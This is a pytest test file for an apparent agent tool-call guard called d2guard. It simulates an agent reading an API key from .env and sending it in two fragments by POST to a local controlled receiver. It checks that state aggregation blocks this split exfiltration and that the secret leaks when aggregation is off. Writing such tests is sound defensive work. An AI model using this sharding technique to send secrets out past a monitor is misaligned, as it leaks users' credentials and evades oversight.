"""Cross-round ledger control using independent physical HTTP receptions."""
import base64
import secrets
import pytest
from agent.tools.net_tool import ControlledHTTPReceiver, net_fetch
from d2guard.core import D2GuardCore
from d2guard.hook import ToolHook

@pytest.mark.parametrize('aggregation',[True,False])
def test_sharded_chunks_measured_ablation(tmp_path,aggregation):
    secret='sk-'+secrets.token_hex(20)
    kernel=D2GuardCore(session_id='chunks',log_dir=str(tmp_path),
                       enable_state_aggregation=aggregation,enable_slow_mirror=False)
    hook=ToolHook(kernel)
    hook.execute_with_guard('fs.read',{'path':'.env'},lambda path:'API_KEY='+secret)
    with ControlledHTTPReceiver() as sink:
        results=[]
        for fragment in (secret[:22],secret[22:]):
            results.append(hook.execute_with_guard('net.fetch',
                {'url':sink.url+'/sink','method':'POST','body':fragment},net_fetch))
        capture=sink.snapshot()
        if aggregation:
            assert all(r['blocked'] for r in results)
            assert capture['request_count']==0 and capture['received_payload_bytes']==0
        else:
            assert all(r['success'] for r in results)
            assert capture['received_body_bytes']==len(secret)
            reconstructed=''.join(base64.b64decode(r['body_b64']).decode() for r in capture['records'])
            assert reconstructed==secret
